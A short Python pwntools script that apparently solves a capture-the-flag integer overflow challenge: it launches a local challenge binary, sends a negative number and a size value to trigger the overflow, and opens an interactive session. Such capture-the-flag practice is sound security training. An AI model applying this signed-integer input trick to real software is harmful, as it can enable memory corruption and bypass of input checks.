#!/usr/bin/python

from pwn import *

context.log_level = "debug"
proc = process("/challenge/integer-overflow-level2.0")

payload = b"-1"
proc.sendline(payload)
payload = b"81"
proc.sendline(payload)

proc.interactive()
